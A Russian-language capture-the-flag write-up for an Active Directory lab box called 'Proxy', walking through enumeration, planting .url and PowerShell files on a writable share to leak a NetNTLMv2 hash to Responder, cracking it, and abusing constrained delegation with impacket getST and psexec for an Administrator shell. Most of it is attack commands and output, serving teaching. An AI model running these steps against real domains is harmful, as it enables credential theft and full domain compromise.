# Proxy

### Необходимые навыки

- Перечисление Active Directory: BloodHound, enum4linux-ng, kerbrute, nxc
- Работа с Kerberos: AS-REP Roasting, Kerberoasting, ограниченное делегирование (constrained delegation)
- Захват NetNTLMv2-хэша через поддельный .url/.ps1-файл и Responder
- Работа с impacket: getST, psexec

---

### Перечисление

Начинаем со сканирования портов:

```
rustscan --ulimit 5000 --range 0-65535 -a ip -- -O -sC -sV -oX proxy.xml
PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 126 Simple DNS Plus
88/tcp    open  kerberos-sec  syn-ack ttl 126 Microsoft Windows Kerberos (server time: 2026-07-08 11:53:20Z)
135/tcp   open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 126 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 126 Microsoft Windows Active Directory LDAP (Domain: ctf.local, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds? syn-ack ttl 126
464/tcp   open  kpasswd5?     syn-ack ttl 126
593/tcp   open  ncacn_http    syn-ack ttl 126 Microsoft Windows RPC over HTTP 1.0
3268/tcp  open  ldap          syn-ack ttl 126 Microsoft Windows Active Directory LDAP (Domain: ctf.local, Site: Default-First-Site-Name)
3389/tcp  open  ms-wbt-server syn-ack ttl 126 Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: CTF
|   NetBIOS_Domain_Name: CTF
|   NetBIOS_Computer_Name: DC01
|   DNS_Domain_Name: ctf.local
|   DNS_Computer_Name: DC01.ctf.local
|   DNS_Tree_Name: ctf.local
|   Product_Version: 10.0.17763
|_  System_Time: 2026-07-08T11:54:16+00:00
7680/tcp  open  pando-pub?    syn-ack ttl 126
9389/tcp  open  mc-nmf        syn-ack ttl 126 .NET Message Framing
49668/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49676/tcp open  ncacn_http    syn-ack ttl 126 Microsoft Windows RPC over HTTP 1.0
```

Имя компьютера `DC01.ctf.local` и набор портов однозначно указывают на контроллер домена. Наибольший интерес представляют LDAP, Kerberos, SMB и RPC.

Запрашиваем все записи DNS через zone transfer, чтобы понять топологию сети: `dig axfr @ip ctf.local` — оказывается, в домене только сам DC.

Запускаем расширенное перечисление:

`enum4linux-ng -A ip -oA enum_proxy.txt`

Нулевая сессия RPC доступна, но команды `querydispinfo` и `enumdomuser` возвращают `NT_STATUS_ACCESS_DENIED` — много из неё не вытащить. Попытки RID-брутфорса через SMB (`nxc smb ip -u '' -p '' --rid-brute 2000`) и перечисление через LDAP без аутентификации — тоже без результата.

Пробуем вытащить имена пользователей через Kerberos:

```
kerbrute userenum --dc ip -d ctf.local /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt

2026/07/08 15:43:16 >  [+] VALID USERNAME:       guest@ctf.local
2026/07/08 15:43:16 >  [+] VALID USERNAME:       administrator@ctf.local
```

Проверяем гостевую запись: `nxc smb ip -u guest -p ''` — учётная запись активна и не требует пароля. AS-REP Roasting для администратора не работает (флаг `UF_DONT_REQUIRE_PREAUTH` не выставлен), Kerberoasting через гостевую учётку тоже недоступен — не хватает прав в LDAP для запроса SPN.

Смотрим SMB-шары с гостевым аккаунтом:

```
smbmap -H ip -u 'guest' -p ''
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    READ ONLY       Remote IPC
        IT-Shared                                               READ, WRITE     IT Department Shared Resources
        NETLOGON                                                NO ACCESS       Logon server share 
        SYSVOL                                                  NO ACCESS       Logon server share 
```

Шара `IT-Shared` с правами на запись — интересно. Подключаемся:

`smbclient //ip/IT-Shared -U 'ctf.local\guest%'`

В файлах два полезных момента: несколько якобы устаревших паролей и описание службы сканирования:

```
smb: \> get IT-Onboarding-Checklist.txt -
  File Scanner (svc.scanner)
    Runs every 2 minutes. Enumerates IT-Shared for new files to process.
    Uses Shell enumeration to inspect file metadata and icons.
    Contact sysadmin if files are not being processed.
```

---

### Захват хэша

Распыляем полученные пароли по известным учётным записям: `nxc smb ip -u administrator -p pass.txt` — ни один не подошёл.

Раз служба каждые 2 минуты обходит шару и обрабатывает файлы через Shell (то есть, скорее всего, инициирует сетевые подключения), пробуем поймать NetNTLMv2-хэш. Запускаем Responder:

`sudo responder -I tun0`

Кладём в шару .url-файл с указанием на нашу машину в поле иконки:

```
cat > @Shortcut.url << 'EOF'
[InternetShortcut]
URL=http://ctf.local
WorkingDirectory=ctf
IconFile=\\ip\icons\icon.ico
IconIndex=1
EOF
```

`put @Shortcut.url`

Хэш не пришёл — вероятно, служба не загружает иконки при обработке файлов. Меняем подход: кладём PowerShell-скрипт, который явно обращается к нашей шаре:

`echo 'Test-Path \\ip\icons\icon.ico' > trigger.ps1`

На этот раз срабатывает. Responder ловит NetNTLMv2-хэш:

`NTLMv2-SSP Hash : svc.scanner::CTF:3e5e...`

Пробуем взломать оффлайн:

`hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt`

Пароль найден. Однако подключиться напрямую к машине через WinRM, RDP или psexec не выходит — у `svc.scanner` нет нужных прав.

---

### Эксплуатация делегирования

Собираем полный граф объектов домена через BloodHound:

```
bloodhound-python -u svc.scanner -p '***' -d ctf.local -ns ip -c All --zip
./bloodhound-cli containers start
```

Загружаем архив в интерфейс, строим путь до Administrator:

<img width="1627" height="450" alt="image" src="https://github.com/user-attachments/assets/242ae21d-f168-4fe1-b152-a0e6a98a4efa" />

Граф показывает:

- `SVC.SCANNER` → `DC01` по ребру **AllowedToDelegate**: учётная запись службы имеет право ограниченного делегирования на контроллер домена. Это означает возможность запросить билет Kerberos от имени любого пользователя домена для доступа к службам DC — в том числе от имени Administrator.
- `DC01` → домен по ребру **CoerceToTGT**: компрометация DC фактически означает компрометацию всего домена (доступ к NTDS.dit с хэшами всех пользователей).

Выпускаем билет для Administrator через S4U2Proxy:

```
echo "ip dc01.ctf.local dc01" | sudo tee -a /etc/hosts
impacket-getST ctf.local/svc.scanner:'***' -spn cifs/dc01.ctf.local -impersonate Administrator -dc-ip ip
export KRB5CCNAME=Administrator@cifs_dc01.ctf.local@CTF.LOCAL.ccache
impacket-psexec -k -no-pass dc01.ctf.local
```

Получаем shell от имени Administrator. Забираем флаг:

`type C:\Users\Administrator\Desktop\flag.txt`
